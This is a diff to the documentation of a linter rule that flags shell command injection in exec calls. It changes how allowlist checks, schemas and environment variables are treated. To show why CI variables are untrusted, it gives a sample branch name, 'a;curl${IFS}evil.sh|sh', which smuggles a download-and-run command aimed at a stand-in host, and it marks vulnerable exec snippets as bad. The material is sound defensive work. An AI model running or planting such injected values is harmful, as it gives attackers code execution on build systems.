@@ -102,19 +102,29 @@ expressions, or a `+` of literals only (`'ls ' + '-la'`). Neither is a part that
 
 A runtime part is left alone when the function gave up on any other value before the call: an
 `if` whose branch ends in `return`, `throw`, `break` or `continue`, earlier in an enclosing block,
-or an `if (check) { ... }` around the call. The check must be one the rule can read:
+or an `if (check) { ... }` around the call, in the same function as the call: a check outside a
+callback, or above a hoisted function declaration, does not count inside it. The check must be one
+the rule can read:
 
 - an allowlist of literals: `includes` on an array literal, `has` on a `new Set([...])` (inline or
-  in a `const`), or `===` / `!==` against literals;
+  in a `const`), `===` / `!==` against literals, or `==` / `!=` against a string literal. A list in
+  a `const` counts only if it never changes: it is not exported, and every use of it is an
+  `includes` / `has` call (or `new Set(list)`), so no `push`, `add` or `list[0] = x` anywhere;
 - `test` with a regex (inline or in a `const`) anchored at both ends, without the `m` flag, whose
   every character is shell-inert: no `.`, no `\s` (it admits a newline), no negated class, and
   none of ``;&|$`()<>{}[]*?!~'"\^`` or a line break. Space, `-`, `%` and `#` are allowed;
 - a schema with such a pattern or a literal set: `const { error, value } = schema.validate(x)`
   followed by an exiting `if (error)`, or `schema.parse(x)` (which throws), where the schema is an
-  in-file chain with `.pattern(re)` / `.regex(re)` or `.valid(...)` / `.enum([...])` / `.literal(...)`.
+  in-file chain with `.pattern(re)` / `.regex(re)` (no options argument; a string name or message
+  is fine) or `.valid(...)` / `.enum([...])` / `.literal(...)`, and every other method in the chain
+  only narrows (`min`, `max`, `length`, `required`, `optional`, `trim`, `lowercase` and the like).
+  A chain with `default`, `catch`, `failover`, `pipe`, `transform`, `allow` or any other method
+  can let another value through and is not read.
 
-Every write to the checked binding must come before the check, and the rule follows `const`
-aliases (`const picked = sort`) and `String(x)`:
+Every write to the checked binding must come before the check, in the function that declares it:
+a write from a nested function (`const reset = () => { x = other; }`) cancels the check, since it
+can run at any time. The rule follows `const` aliases (`const picked = sort`) and the global
+`String(x)`:
 
 ```ts bad
 // the check does not stop the call: it only logs
@@ -146,20 +156,46 @@ metacharacter keeps the report.
 
 ### Values the operator sets
 
-A value read from `process.env` is set by whoever runs the process, not by the requester, so it is
-left alone: directly, through `const` bindings, `String()`, string methods with literal arguments
-(`.trim()`, `.replace(/\0/g, '')`), literal fallbacks (`|| ''`), and templates or `+` of such
-values and literals.
+A value read from `process.env` is reported by default. In CI some variables hold text an outsider
+chose: `GITHUB_HEAD_REF` is the branch name of a pull request from a fork, and a branch can be
+named `` a;curl${IFS}evil.sh|sh ``.
 
-```ts good
-exec(`git -C ${process.env.REPO_DIR} status`);
+```ts bad
+exec(`git checkout ${process.env.GITHUB_HEAD_REF}`);
 ```
+
+With `trustEnvironment: true`, a value read from `process.env` with a fixed key is treated as set
+by whoever runs the process and left alone: directly, through `const` bindings, `String()`, string
+methods with literal arguments (`.trim()`, `.replace(/\0/g, '')`), literal fallbacks (`|| ''`),
+and templates or `+` of such values and literals. A computed key (`process.env[name]`) is still
+reported. Turn it on only where no variable carries outside input.
+
+```ts bad options={"trustEnvironment":true}
+// a computed key could name any variable
+export function status(name: string) {
+  exec(`git -C ${process.env[name]} status`);
+}
+```
+
+```ts good options={"trustEnvironment":true}
+export function status() {
+  exec(`git -C ${process.env.REPO_DIR} status`);
+}
+```
+
+### What the rule does not see
+
+In sloppy-mode scripts `arguments[0] = other` also changes the first parameter; ES modules and
+TypeScript output are strict, where it does not. A checked array changed in place after the check
+(`parts.push(y)`, `parts[0] = y`) cancels the check, but one handed to a function that changes it
+is not tracked; check the string you interpolate.
 
 ## Options
 
 | Option | Type | Default | Meaning |
 | --- | --- | --- | --- |
 | `extraCallees` | `string[]` | `[]` | Extra callee names to treat as always-shell command runners (checked like `exec`). |
+| `trustEnvironment` | `boolean` | `false` | Leave values read from `process.env` with a fixed key alone. Off by default because CI variables such as `GITHUB_HEAD_REF` hold outside input. |
 
 ```js
 'noctcore-security/no-shell-interpolation': ['error', { extraCallees: ['runShell', 'sh'] }]
